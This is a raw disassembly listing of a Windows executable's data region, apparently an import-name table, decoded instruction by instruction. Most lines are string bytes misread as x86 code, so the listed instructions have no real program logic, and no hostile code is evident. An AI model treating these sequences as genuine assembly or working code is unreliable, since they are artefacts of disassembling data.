  4376f5:	dec    ecx
  4376f6:	dec    esp
  4376f7:	popa   
  4376f8:	outs   dx,BYTE PTR ds:[esi]
  4376f9:	addr16 jne 0x43775d
  4376fc:	addr16 gs jae 0x437700
  437700:	or     al,BYTE PTR [ebx]
  437702:	inc    edi
  437703:	gs je  0x43775a
  437706:	push   0x64616572
  43770b:	push   eax
  43770c:	jb     0x437773
  43770e:	data16 gs jb 0x437784
  437712:	gs fs push ebp
  437715:	dec    ecx
  437716:	dec    esp
  437717:	popa   
  437718:	outs   dx,BYTE PTR ds:[esi]
  437719:	addr16 jne 0x43777d
  43771c:	addr16 gs jae 0x437720
  437720:	dec    ebp
  437721:	add    ecx,DWORD PTR [eax+0x65]
  437724:	popa   
  437725:	jo     0x437768
  437727:	ins    BYTE PTR es:[edi],dx
  437728:	ins    BYTE PTR es:[edi],dx
  437729:	outs   dx,DWORD PTR ds:[esi]
  43772a:	arpl   WORD PTR [eax],ax
  43772c:	mov    edx,0x74654702
  437731:	push   eax
  437732:	jb     0x4377a3
  437734:	arpl   WORD PTR [ebp+0x73],sp
  437737:	jae    0x437781
  437739:	gs popa 
  43773b:	jo     0x43773d
  43773d:	add    BYTE PTR [ecx+0x3],dl
  437740:	dec    eax
  437741:	gs popa 
  437743:	jo     0x43778b
  437745:	jb     0x4377ac
  437747:	add    BYTE PTR gs:[eax],al
  43774a:	push   0x2
  43774c:	inc    edi
  43774d:	gs je  0x43779c
  437750:	popa   
  437751:	jae    0x4377c7
  437753:	inc    ebp
  437754:	jb     0x4377c8
  437756:	outs   dx,DWORD PTR ds:[esi]
  437757:	jb     0x437759
  437759:	add    dl,al
  43775b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  43775f:	fs dec esp
  437761:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  437768:	js     0x4377c1
  43776a:	add    BYTE PTR [eax],al
  43776c:	and    DWORD PTR [ebx],eax
  43776e:	inc    edi
  43776f:	gs je  0x4377c8
  437772:	gs jb  0x4377e8
  437775:	imul   ebp,DWORD PTR [edi+0x6e],0x1710000
  43777c:	inc    ebp
  43777d:	js     0x4377ef
  43777f:	popa   
  437780:	outs   dx,BYTE PTR ds:[esi]
  437781:	fs inc ebp
  437783:	outs   dx,BYTE PTR ds:[esi]
  437784:	jbe    0x4377ef
  437786:	jb     0x4377f7
  437788:	outs   dx,BYTE PTR ds:[esi]
  437789:	ins    DWORD PTR es:[edi],dx
  43778a:	outs   dx,BYTE PTR gs:[esi]
  43778c:	je     0x4377e1
  43778e:	je     0x437802
  437790:	imul   ebp,DWORD PTR [esi+0x67],0xd3005773
  437797:	add    BYTE PTR [ebx+0x72],al
  43779a:	gs popa 
  43779c:	je     0x437803
  43779e:	inc    esi
  43779f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4377a7:	outs   dx,BYTE PTR ds:[esi]
  4377a8:	addr16 push edi
  4377aa:	add    BYTE PTR [eax],al
  4377ac:	fild   DWORD PTR [ebx]
  4377ae:	dec    ebp
  4377af:	popa   
  4377b0:	jo     0x437808
  4377b2:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4377b9:	ins    BYTE PTR es:[edi],dx
  4377ba:	gs add dl,cl
  4377bd:	add    BYTE PTR [ebx+0x72],al
  4377c0:	gs popa 
  4377c2:	je     0x437829
  4377c4:	inc    ebp
  4377c5:	jbe    0x43782c
  4377c7:	outs   dx,BYTE PTR ds:[esi]
  4377c8:	je     0x437821
  4377ca:	add    BYTE PTR [eax],al
  4377cc:	in     eax,0x0
  4377ce:	inc    ebx
  4377cf:	jb     0x437836
  4377d1:	popa   
  4377d2:	je     0x437839
  4377d4:	dec    ebp
  4377d5:	jne    0x43784b
  4377d7:	gs js  0x437831
  4377da:	add    BYTE PTR [eax],al
  4377dc:	and    eax,DWORD PTR [edx]
  4377de:	inc    edi
  4377df:	gs je  0x437825
  4377e2:	jne    0x437856
  4377e4:	jb     0x43784b
  4377e6:	outs   dx,BYTE PTR ds:[esi]
  4377e7:	je     0x437839
  4377e9:	jb     0x43785a
  4377eb:	arpl   WORD PTR [ebp+0x73],sp
  4377ee:	jae    0x4377f0
  4377f0:	cmp    DWORD PTR [ecx],eax
  4377f2:	inc    esp
  4377f3:	jne    0x437865
  4377f5:	ins    BYTE PTR es:[edi],dx
  4377f6:	imul   esp,DWORD PTR [ebx+0x61],0x61486574
  4377fd:	outs   dx,BYTE PTR ds:[esi]
  4377fe:	fs ins BYTE PTR es:[edi],dx
  437800:	add    BYTE PTR gs:[edx+eax*1],ah
  437804:	inc    edi
  437805:	gs je  0x43784b
  437808:	jne    0x43787c
  43780a:	jb     0x437871
  43780c:	outs   dx,BYTE PTR ds:[esi]
  43780d:	je     0x43785f
  43780f:	jb     0x437880
  437811:	arpl   WORD PTR [ebp+0x73],sp
  437814:	jae    0x43785f
  437816:	add    BYTE PTR fs:[eax],ch
  437819:	add    al,BYTE PTR [edi+0x65]
  43781c:	je     0x437861
  43781e:	jne    0x437892
  437820:	jb     0x437887
  437822:	outs   dx,BYTE PTR ds:[esi]
  437823:	je     0x437879
  437825:	push   0x64616572
  43782a:	dec    ecx
  43782b:	add    BYTE PTR fs:[eax],al
  43782e:	out    dx,eax
  43782f:	add    BYTE PTR [ebx+0x72],al
  437832:	gs popa 
  437834:	je     0x43789b
  437836:	push   eax
  437837:	jb     0x4378a8
  437839:	arpl   WORD PTR [ebp+0x73],sp
  43783c:	jae    0x437895
  43783e:	add    BYTE PTR [eax],al
  437840:	xchg   edi,eax
  437841:	add    al,0x52
  437843:	gs ins BYTE PTR es:[edi],dx
  437845:	gs popa 
  437847:	jae    0x4378ae
  437849:	dec    ebp
  43784a:	jne    0x4378c0
  43784c:	gs js  0x43784f
  43784f:	add    ah,bh
  437851:	add    al,0x53
  437853:	gs je  0x43789b
  437856:	jbe    0x4378bd
  437858:	outs   dx,BYTE PTR ds:[esi]
  437859:	je     0x43785b
  43785b:	add    BYTE PTR [ebx+0x6d6e5505],dl
  437861:	popa   
  437862:	jo     0x4378ba
  437864:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  43786b:	ins    BYTE PTR es:[edi],dx
  43786c:	gs add bl,bh
  43786f:	add    al,0x53
  437871:	gs je  0x4378b9
  437874:	jb     0x4378e8
  437876:	outs   dx,DWORD PTR ds:[esi]
  437877:	jb     0x4378c6
  437879:	outs   dx,DWORD PTR ds:[esi]
  43787a:	fs add BYTE PTR gs:[eax],al
  43787e:	push   eax
  43787f:	add    eax,0x55746553
  437884:	outs   dx,BYTE PTR ds:[esi]
  437885:	push   0x6c646e61
  43788a:	gs fs inc ebp
  43788d:	js     0x4378f2
  43788f:	gs jo  0x437906
  437892:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  437899:	gs jb  0x43789c
  43789c:	mov    bl,0x5
  43789e:	push   esi
  43789f:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  4378a6:	jne    0x43790d
  4378a8:	jb     0x437923
  4378aa:	add    BYTE PTR [eax],al
  4378ac:	jge    0x4378b0
  4378ae:	inc    edi
  4378af:	gs je  0x4378ff
  4378b2:	outs   dx,DWORD PTR ds:[esi]
  4378b3:	fs jne 0x437922
  4378b6:	gs inc esi
  4378b8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  4378c0:	add    BYTE PTR [eax],al
  4378c2:	push   edi
  4378c3:	add    al,BYTE PTR [edi+0x65]
  4378c6:	je     0x43790e
  4378c8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  4378d0:	or     BYTE PTR [edx],al
  4378d2:	inc    edi
  4378d3:	gs je  0x437919
  4378d6:	outs   dx,DWORD PTR ds:[esi]
  4378d7:	outs   dx,BYTE PTR ds:[esi]
  4378d8:	jae    0x437949
  4378da:	ins    BYTE PTR es:[edi],dx
  4378db:	gs dec ebp
  4378dd:	outs   dx,DWORD PTR ds:[esi]
  4378de:	fs add BYTE PTR gs:[eax],al
  4378e2:	js     0x4378e5
  4378e4:	inc    esi
  4378e5:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  4378ed:	outs   dx,DWORD PTR ds:[esi]
  4378ee:	dec    esp
  4378ef:	outs   dx,DWORD PTR ds:[esi]
  4378f0:	arpl   WORD PTR [ecx+0x6c],sp
  4378f3:	inc    esi
  4378f4:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  4378fc:	jns    0x4378ff
  4378fe:	inc    esi
  4378ff:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  437907:	outs   dx,DWORD PTR ds:[esi]
  437908:	push   ebx
  437909:	jns    0x43797e
  43790b:	je     0x437972
  43790d:	ins    DWORD PTR es:[edi],dx
  43790e:	push   esp
  43790f:	imul   ebp,DWORD PTR [ebp+0x65],0x22d0000
  437916:	inc    edi
  437917:	gs je  0x43795e
  43791a:	popa   
  43791b:	je     0x437982
  43791d:	inc    esi
  43791e:	outs   dx,DWORD PTR ds:[esi]
  43791f:	jb     0x43798e
  437921:	popa   
  437922:	je     0x43797b
  437924:	add    BYTE PTR [eax],al
  437926:	adc    eax,0x74654703
  43792b:	push   esp
  43792c:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  437933:	popa   
  437934:	je     0x43798d
  437936:	add    BYTE PTR [eax],al
  437938:	dec    ebx
  437939:	inc    ebp
  43793a:	push   edx
  43793b:	dec    esi
  43793c:	inc    ebp
  43793d:	dec    esp
  43793e:	xor    esi,DWORD PTR [edx]
  437940:	cs fs ins BYTE PTR es:[edi],dx
  437943:	ins    BYTE PTR es:[edi],dx
  437944:	add    BYTE PTR [eax],al
  437946:	aam    0x5
  437948:	data16 jb 0x4379b0
  43794b:	add    BYTE PTR gs:[eax],al
  43794e:	and    al,BYTE PTR ds:0x7363775f
  437954:	imul   esp,DWORD PTR [ebx+0x6d],0x87000070
  43795b:	push   es
  43795c:	ja     0x4379c1
  43795e:	jae    0x4379d0
  437960:	bound  esi,QWORD PTR [edx+0x6b]
  437963:	add    BYTE PTR [ecx+0x6],bh
  437966:	ja     0x4379cb
  437968:	jae    0x4379cd
  43796a:	push   0x72
  43796f:	push   es
  437970:	imul   esi,DWORD PTR [ebx+0x77],0x63617073
  437977:	add    BYTE PTR gs:[eax],al
  43797a:	add    ax,0x775f
  43797e:	addr16 gs je 0x4379e7
  437982:	outs   dx,BYTE PTR ds:[esi]
  437983:	jbe    0x4379e4
  437985:	jae    0x437987
  437987:	add    BYTE PTR [edi+0x73637706],cl
  43798d:	je     0x4379fe
  43798f:	imul   ebx,DWORD PTR [edi+0x73],0x0
  437993:	add    BYTE PTR [ebp+0x5],dh
  437996:	pop    edi
  437997:	ja     0x437a09
  437999:	jne    0x437a0f
  43799b:	outs   dx,BYTE PTR gs:[esi]
  43799d:	jbe    0x4379fe
  43799f:	jae    0x4379a1
  4379a1:	add    BYTE PTR [ebp+0x6],bh
  4379a4:	ja     0x437a09
  4379a6:	jae    0x437a0b
  4379a8:	jo     0x437a23
  4379aa:	pop    edi
  4379ab:	jae    0x4379ad
  4379ad:	add    BYTE PTR [eax+0x6],bh
  4379b0:	ja     0x437a15
  4379b2:	jae    0x437a17
  4379b4:	popa   
  4379b5:	je     0x437a16
  4379b7:	jae    0x4379b9
  4379b9:	add    bh,al
  4379bb:	add    eax,0x74656766
  4379c0:	ja     0x437a35
  4379c2:	add    BYTE PTR [eax],al
  4379c4:	popa   
  4379c5:	add    eax,0x7366775f
  4379ca:	outs   dx,DWORD PTR ds:[esi]
  4379cb:	jo     0x437a32
  4379cd:	outs   dx,BYTE PTR ds:[esi]
  4379ce:	add    BYTE PTR [eax],al
  4379d0:	mov    edi,0x6c636605
  4379d5:	outs   dx,DWORD PTR ds:[esi]
  4379d6:	jae    0x437a3d
  4379d8:	add    BYTE PTR [eax],al
  4379da:	sub    al,0x6
  4379dc:	jb     0x437a43
  4379de:	popa   
  4379df:	ins    BYTE PTR es:[edi],dx
  4379e0:	ins    BYTE PTR es:[edi],dx
  4379e1:	outs   dx,DWORD PTR ds:[esi]
  4379e2:	arpl   WORD PTR [eax],ax
  4379e4:	or     eax,0x6c616d06
  4379e9:	ins    BYTE PTR es:[edi],dx
  4379ea:	outs   dx,DWORD PTR ds:[esi]
  4379eb:	arpl   WORD PTR [eax],ax
  4379ed:	add    BYTE PTR [ebp+eax*1+0x74697865],bh
  4379f4:	add    BYTE PTR [eax],al
  4379f6:	mov    eax,DWORD PTR [esi]
  4379f8:	ja     0x437a5d
  4379fa:	jae    0x437a6f
  4379fc:	jo     0x437a6c
  4379fe:	add    BYTE PTR [eax],al
  437a00:	sti    
  437a01:	add    eax,0x64777369
  437a06:	imul   esp,DWORD PTR [edi+0x69],0x93000074
  437a0d:	push   es
  437a0e:	ja     0x437a73
  437a10:	jae    0x437a86
  437a12:	outs   dx,DWORD PTR ds:[esi]
  437a13:	jne    0x437a81
  437a15:	add    BYTE PTR [ebp+0x2],bl
  437a18:	pop    edi
  437a19:	gs jb  0x437a8e
  437a1c:	outs   dx,BYTE PTR ds:[esi]
  437a1d:	outs   dx,DWORD PTR ds:[esi]
  437a1e:	add    BYTE PTR [eax],al
  437a20:	dec    edx
  437a21:	add    eax,0x7564775f
  437a26:	jo     0x437a8d
  437a28:	outs   dx,BYTE PTR ds:[esi]
  437a29:	jbe    0x437a8a
  437a2b:	jae    0x437a2d
  437a2d:	add    bh,dh
  437a2f:	add    eax,0x61777369
  437a34:	ins    BYTE PTR es:[edi],dx
  437a35:	jo     0x437a9f
  437a37:	popa   
  437a38:	add    BYTE PTR [eax],al
  437a3a:	and    al,BYTE PTR [edx]
  437a3c:	pop    edi
  437a3d:	arpl   WORD PTR [eax+0x64],bp
  437a40:	jb     0x437aab
  437a42:	jbe    0x437aa9
  437a44:	add    BYTE PTR [eax],al
  437a46:	addr16 push es
  437a48:	je     0x437ab9
  437a4a:	ja     0x437ac1
  437a4c:	jo     0x437abe
  437a4e:	gs jb  0x437a51
  437a51:	add    BYTE PTR [ebp+eax*1+0x5f],dh
  437a55:	ja     0x437ac7
  437a57:	jne    0x437acd
  437a59:	outs   dx,BYTE PTR gs:[esi]
  437a5b:	jbe    0x437a5d
  437a5d:	add    BYTE PTR [eax*1+0x7363775f],ch
  437a64:	outs   dx,BYTE PTR ds:[esi]
  437a65:	imul   esp,DWORD PTR [ebx+0x6d],0x5180070
  437a6c:	pop    edi
  437a6d:	ja     0x437ad2
  437a6f:	push   0x726964
  437a74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437a75:	add    DWORD PTR [edi+0x5f],ebx
  437a78:	imul   ebp,DWORD PTR [edi+0x62],0x6e75665f
  437a7f:	arpl   WORD PTR [eax],ax
  437a81:	add    BYTE PTR [eax+0x73775f05],al
  437a87:	outs   dx,DWORD PTR ds:[esi]
  437a88:	jo     0x437aef
  437a8a:	outs   dx,BYTE PTR ds:[esi]
  437a8b:	pop    edi
  437a8c:	jae    0x437a8e
  437a8e:	push   ebp
  437a8f:	add    bl,BYTE PTR [edi+0x64]
  437a92:	jne    0x437b04
  437a94:	xor    al,BYTE PTR [eax]
  437a96:	ja     0x437a9a
  437a98:	pop    edi
  437a99:	imul   bp,WORD PTR [ebp+eiz*2+0x6e],0x6f
  437aa0:	jne    0x437aa5
  437aa2:	pop    edi
  437aa3:	ins    BYTE PTR es:[edi],dx
  437aa4:	jae    0x437b0b
  437aa6:	imul   eax,DWORD PTR gs:[eax],0x0
  437aaa:	push   esp
  437aab:	add    bl,BYTE PTR [edi+0x64]
  437aae:	jne    0x437b20
  437ab0:	add    BYTE PTR [eax],al
  437ab2:	sub    DWORD PTR [edx],eax
  437ab4:	pop    edi
  437ab5:	arpl   WORD PTR [edi+ebp*2+0x73],bp
  437ab9:	add    BYTE PTR gs:[eax],al
  437abc:	mov    al,BYTE PTR ds:0x7073775f
  437ac2:	ins    BYTE PTR es:[edi],dx
  437ac3:	imul   esi,DWORD PTR [eax+esi*2+0x61],0x735f6874
  437acb:	add    BYTE PTR [eax+0x5],ch
  437ace:	pop    edi
  437acf:	ja     0x437b3e
  437ad1:	popa   
  437ad2:	imul   esp,DWORD PTR [ebp+0x70],0x61
  437ad6:	je     0x437b40
  437ad8:	pop    edi
  437ad9:	jae    0x437adb
  437adb:	add    BYTE PTR [eax*1+0x6361775f],dl
  437ae2:	arpl   WORD PTR [ebp+0x73],sp
  437ae5:	jae    0x437b46
  437ae7:	jae    0x437ae9
  437ae9:	add    BYTE PTR [edx],bl
  437aeb:	push   es
  437aec:	ins    DWORD PTR es:[edi],dx
  437aed:	gs ins DWORD PTR es:[edi],dx
  437aef:	ins    DWORD PTR es:[edi],dx
  437af0:	outs   dx,DWORD PTR ds:[esi]
  437af1:	jbe    0x437b58
  437af3:	add    BYTE PTR [esi+0x5],ch
  437af6:	pop    edi
  437af7:	ja     0x437b69
  437af9:	ins    DWORD PTR es:[di],dx
  437afb:	jo     0x437b71
  437afd:	jb     0x437aff
  437aff:	add    BYTE PTR [edi+0x73775f05],al
  437b05:	jo     0x437b68
  437b07:	ja     0x437b77
  437b09:	jbe    0x437b7b
  437b0b:	add    BYTE PTR [ebp+0x645f5f01],bl
  437b11:	outs   dx,DWORD PTR ds:[esi]
  437b12:	jae    0x437b79
  437b14:	jb     0x437b88
  437b16:	outs   dx,BYTE PTR ds:[esi]
  437b17:	outs   dx,DWORD PTR ds:[esi]
  437b18:	add    BYTE PTR [eax],al
  437b1a:	and    BYTE PTR ds:0x7363775f,al
  437b20:	gs jb  0x437b95
  437b23:	outs   dx,DWORD PTR ds:[esi]
  437b24:	jb     0x437b85
  437b26:	jae    0x437b28
  437b28:	jl     0x437b2f
  437b2a:	pop    edi
  437b2b:	ja     0x437ba0
  437b2d:	gs popa 
  437b2f:	jb     0x437b94
  437b31:	push   0x766e65
  437b36:	mov    BYTE PTR [esi],al
  437b38:	ja     0x437b9d
  437b3a:	jae    0x437bae
  437b3c:	arpl   WORD PTR [eax+0x72],bp
  437b3f:	add    dh,al
  437b41:	add    eax,0x74656766
  437b46:	ja     0x437bab
  437b48:	add    BYTE PTR [eax],al
  437b4a:	imul   eax,DWORD PTR [esi],0x65676e75
  437b50:	je     0x437bc9
  437b52:	arpl   WORD PTR [eax],ax
  437b54:	rol    BYTE PTR ds:0x666f6566,0x0
  437b5b:	add    BYTE PTR [ebp+0x73637706],al
  437b61:	outs   dx,BYTE PTR ds:[esi]
  437b62:	arpl   WORD PTR [eax+0x79],si
  437b65:	pop    edi
  437b66:	jae    0x437b68
  437b68:	mov    WORD PTR [esi],es
  437b6a:	ja     0x437bcf
  437b6c:	jae    0x437be1
  437b6e:	je     0x437be2
  437b70:	add    BYTE PTR [eax],al
  437b72:	fild   WORD PTR ds:0x69727766
  437b78:	je     0x437bdf
  437b7a:	add    BYTE PTR [eax],al
  437b7c:	add    DWORD PTR [esi],0x77
  437b7f:	arpl   WORD PTR [ebx+0x6e],si
  437b82:	arpl   WORD PTR [ebp+0x70],bp
  437b85:	add    BYTE PTR [edx+0x73637706],al
  437b8b:	outs   dx,BYTE PTR ds:[esi]
  437b8c:	arpl   WORD PTR [ecx+0x74],sp
  437b8f:	pop    edi
  437b90:	jae    0x437b92
  437b92:	pop    esp
  437b93:	push   es
  437b94:	jae    0x437c0d
  437b96:	jae    0x437bfb
  437b98:	popa   
  437b99:	outs   dx,BYTE PTR ds:[esi]
  437b9a:	pop    di
  437b9c:	jae    0x437b9e
  437b9e:	push   ebx
  437b9f:	add    ebx,DWORD PTR [edi+0x69]
  437ba2:	je     0x437c13
  437ba4:	ja     0x437c05
  437ba6:	jae    0x437ba8
  437ba8:	sbb    DWORD PTR [esi],eax
  437baa:	ins    DWORD PTR es:[edi],dx
  437bab:	gs ins DWORD PTR es:[edi],dx
  437bad:	arpl   WORD PTR [eax+0x79],si
  437bb0:	pop    edi
  437bb1:	jae    0x437bb3
  437bb3:	add    BYTE PTR [edx+0x6],bl
  437bb6:	jae    0x437c2f
  437bb8:	jo     0x437c2c
  437bba:	imul   ebp,DWORD PTR [esi+0x74],0x735f66
  437bc1:	add    BYTE PTR [ebx],dh
  437bc3:	push   es
  437bc4:	jae    0x437c2b
  437bc6:	je     0x437c34
  437bc8:	outs   dx,DWORD PTR ds:[esi]
  437bc9:	arpl   WORD PTR [ecx+0x6c],sp
  437bcc:	add    BYTE PTR gs:[esp+eax*1+0x5f],cl
  437bd1:	jae    0x437c38
  437bd3:	je     0x437c34
  437bd5:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
  437bdc:	pop    edi
  437bdd:	jo     0x437c40
  437bdf:	jb     0x437c42
  437be1:	ins    DWORD PTR es:[edi],dx
  437be2:	gs je  0x437c4a
  437be5:	jb     0x437c46
  437be7:	push   0x6c646e61
  437bec:	gs jb  0x437bef
  437bef:	add    BYTE PTR ds:0x67697306,dh
  437bf5:	outs   dx,BYTE PTR ds:[esi]
  437bf6:	popa   
  437bf7:	ins    BYTE PTR es:[edi],dx
  437bf8:	add    BYTE PTR [eax],al
  437bfa:	arpl   WORD PTR ds:0x6567775f,ax
  437c00:	je     0x437c65
  437c02:	ja     0x437c68
  437c04:	add    BYTE PTR [eax],al
  437c06:	dec    ebx
  437c07:	add    eax,0x6e65775f
  437c0c:	jbe    0x437c77
  437c0e:	jb     0x437c7f
  437c10:	outs   dx,BYTE PTR ds:[esi]
  437c11:	add    BYTE PTR [eax+0x5],al
  437c14:	pop    edi
  437c15:	ja     0x437c7a
  437c17:	jae    0x437c8e
  437c19:	jo     0x437c8d
  437c1b:	pop    edi
  437c1c:	jae    0x437c1e
  437c1e:	pop    esi
  437c1f:	add    eax,0x6f66775f
  437c24:	jo     0x437c8b
  437c26:	outs   dx,BYTE PTR ds:[esi]
  437c27:	pop    edi
  437c28:	jae    0x437c2a
  437c2a:	adc    eax,DWORD PTR ds:0x6361775f
  437c30:	arpl   WORD PTR [ebp+0x73],sp
  437c33:	jae    0x437c35
  437c35:	add    BYTE PTR [edi+0x75775f05],bl
  437c3b:	outs   dx,BYTE PTR ds:[esi]
  437c3c:	ins    BYTE PTR es:[edi],dx
  437c3d:	imul   ebp,DWORD PTR [esi+0x6b],0x26c0000
  437c44:	pop    edi
  437c45:	data16 arpl WORD PTR [edi+ebp*2+0x73],bp
  437c4a:	gs popa 
  437c4c:	ins    BYTE PTR es:[edi],dx
  437c4d:	ins    BYTE PTR es:[edi],dx
  437c4e:	add    BYTE PTR [eax],al
  437c50:	mov    ebx,0x65675f02
  437c55:	je     0x437cb6
  437c57:	outs   dx,DWORD PTR ds:[esi]
  437c58:	jae    0x437cc0
  437c5a:	push   0x6c646e61
  437c5f:	add    BYTE PTR gs:[eax],al
  437c62:	ret    0x6605
  437c65:	data16 ins BYTE PTR es:[edi],dx
  437c67:	jne    0x437cdc
  437c69:	push   0x4270000
  437c6e:	pop    edi
  437c6f:	jo     0x437ce6
  437c71:	je     0x437cea
  437c73:	arpl   WORD PTR [eax+0x0],bp
  437c76:	rol    BYTE PTR ds:0x74757066,1
  437c7c:	ja     0x437ce1
  437c7e:	add    BYTE PTR [eax],al
  437c80:	loopne 0x437c86
  437c82:	pop    edi
  437c83:	jbe    0x437ce8
  437c85:	ja     0x437cf7
  437c87:	jb     0x437cf2
  437c89:	outs   dx,BYTE PTR ds:[esi]
  437c8a:	je     0x437cf2
  437c8c:	add    BYTE PTR [eax],al
  437c8e:	ins    BYTE PTR es:[edi],dx
  437c8f:	push   es
  437c90:	jbe    0x437cf8
  437c92:	ja     0x437d04
  437c94:	jb     0x437cff
  437c96:	outs   dx,BYTE PTR ds:[esi]
  437c97:	je     0x437cff
  437c99:	add    BYTE PTR [eax+0x73637706],dl
  437c9f:	je     0x437d10
  437ca1:	ins    BYTE PTR es:[edi],dx
  437ca2:	add    BYTE PTR [eax],al
  437ca4:	outs   dx,DWORD PTR ds:[esi]
  437ca5:	add    DWORD PTR [edi+0x58],ebx
  437ca8:	arpl   WORD PTR [eax+0x74],si
  437cab:	inc    esi
  437cac:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x2050072
  437cb4:	pop    edi
  437cb5:	popa   
  437cb6:	ins    DWORD PTR es:[edi],dx
  437cb7:	jae    0x437d20
  437cb9:	pop    edi
  437cba:	gs js  0x437d26
  437cbd:	je     0x437cbf
  437cbf:	add    dh,dh
  437cc1:	add    DWORD PTR [edi+0x5f],ebx
  437cc4:	ja     0x437d2d
  437cc6:	gs je  0x437d36
  437cc9:	popa   
  437cca:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  437cd1:	add    al,ah
  437cd3:	add    DWORD PTR [edi+0x5f],ebx
  437cd6:	jae    0x437d3d
  437cd8:	je     0x437d39
  437cda:	popa   
  437cdb:	jo     0x437d4d
  437cdd:	pop    edi
  437cde:	je     0x437d59
  437ce0:	jo     0x437d47
  437ce2:	add    BYTE PTR [eax],al
  437ce4:	imul   eax,DWORD PTR [edx],0x6978655f
  437cea:	je     0x437cec
  437cec:	sbb    al,0x2
  437cee:	pop    edi
  437cef:	arpl   WORD PTR [ebp+0x78],sp
  437cf2:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x635f022c
  437cfa:	outs   dx,DWORD PTR ds:[esi]
  437cfb:	outs   dx,BYTE PTR ds:[esi]
  437cfc:	imul   sp,WORD PTR [edi+0x74],0x7268
  437d02:	gs popa 
  437d04:	fs ins BYTE PTR es:[edi],dx
  437d06:	outs   dx,DWORD PTR ds:[esi]
  437d07:	arpl   WORD PTR [ecx+0x6c],sp
  437d0a:	gs add dl,ah
  437d0d:	add    DWORD PTR [edi+0x5f],ebx
  437d10:	jae    0x437d77
  437d12:	je     0x437d89
  437d14:	jae    0x437d7b
  437d16:	jb     0x437d85
  437d18:	popa   
  437d19:	je     0x437d83
  437d1b:	gs jb  0x437d90
  437d1e:	add    BYTE PTR [eax],al
  437d20:	out    dx,eax
  437d21:	add    bl,BYTE PTR [edi+0x69]
  437d24:	outs   dx,BYTE PTR ds:[esi]
  437d25:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x655f6d72
  437d2d:	add    dh,ch
  437d2f:	add    bl,BYTE PTR [edi+0x69]
  437d32:	outs   dx,BYTE PTR ds:[esi]
  437d33:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xf7006d72
  437d3b:	add    DWORD PTR [edi+0x5f],ebx
  437d3e:	ja     0x437da9
  437d40:	outs   dx,BYTE PTR ds:[esi]
  437d41:	imul   esi,DWORD PTR [ebp+eiz*2+0x6e],0x84000076
  437d49:	add    bl,BYTE PTR [edi+0x66]
  437d4c:	ins    DWORD PTR es:[edi],dx
  437d4d:	outs   dx,DWORD PTR ds:[esi]
  437d4e:	fs add BYTE PTR gs:[eax],al
  437d52:	sub    eax,DWORD PTR [edx]
  437d54:	pop    edi
  437d55:	arpl   WORD PTR [edi+0x6d],bp
  437d58:	ins    DWORD PTR es:[edi],dx
  437d59:	outs   dx,DWORD PTR ds:[esi]
  437d5a:	fs add BYTE PTR gs:[eax],al
  437d5e:	dec    ebp
  437d5f:	push   ebx
  437d60:	push   esi
  437d61:	inc    ebx
  437d62:	push   edx
  437d63:	xor    DWORD PTR [ecx],esi
  437d65:	xor    BYTE PTR [esi],ch
  437d67:	fs ins BYTE PTR es:[edi],dx
  437d69:	ins    BYTE PTR es:[edi],dx
  437d6a:	add    BYTE PTR [eax],al
  437d6c:	cmp    eax,DWORD PTR [edx]
  437d6e:	pop    edi
  437d6f:	arpl   WORD PTR [edx+0x74],si
  437d72:	pop    edi
  437d73:	fs bound esi,QWORD PTR gs:[ebp+0x67]
  437d78:	addr16 gs jb 0x437ddb
  437d7c:	push   0x6b6f6f
  437d81:	add    BYTE PTR [edx+0x635f5f01],bl
  437d87:	jb     0x437dfd
  437d89:	push   ebp
  437d8a:	outs   dx,BYTE PTR ds:[esi]
  437d8b:	push   0x6c646e61
  437d90:	gs fs inc ebp
  437d93:	js     0x437df8
  437d95:	gs jo  0x437e0c
  437d98:	imul   ebp,DWORD PTR [edi+0x6e],0x5f019900
  437d9f:	pop    edi
  437da0:	arpl   WORD PTR [edx+0x74],si
  437da3:	push   esp
  437da4:	gs jb  0x437e14
  437da7:	imul   ebp,DWORD PTR [esi+0x61],0x72506574
  437dae:	outs   dx,DWORD PTR ds:[esi]
  437daf:	arpl   WORD PTR [ebp+0x73],sp
  437db2:	jae    0x437db4
  437db4:	cmp    eax,DWORD PTR [ecx]
  437db6:	aas    
  437db7:	je     0x437e1e
  437db9:	jb     0x437e28
  437dbb:	imul   ebp,DWORD PTR [esi+0x61],0x40406574
  437dc2:	pop    ecx
  437dc3:	inc    ecx
  437dc4:	pop    eax
  437dc5:	pop    eax
  437dc6:	pop    edx
  437dc7:	add    BYTE PTR [eax+0x635f5f01],bl
  437dcd:	jb     0x437e43
  437dcf:	push   ebx
  437dd0:	gs je  0x437e28
  437dd3:	outs   dx,BYTE PTR ds:[esi]
  437dd4:	push   0x6c646e61
  437dd9:	gs fs inc ebp
  437ddc:	js     0x437e41
  437dde:	gs jo  0x437e55
  437de1:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  437de8:	gs jb  0x437deb
  437deb:	add    BYTE PTR [ebx+eax*1+0x5f],ch
  437def:	ins    BYTE PTR es:[edi],dx
  437df0:	outs   dx,DWORD PTR ds:[esi]
  437df1:	arpl   WORD PTR [ebx+0x0],bp
  437df4:	(bad)  
  437df5:	add    al,0x5f
  437df7:	jne    0x437e67
  437df9:	ins    BYTE PTR es:[edi],dx
  437dfa:	outs   dx,DWORD PTR ds:[esi]
  437dfb:	arpl   WORD PTR [ebx+0x0],bp
  437dfe:	sbb    eax,DWORD PTR [edx]
  437e00:	pop    edi
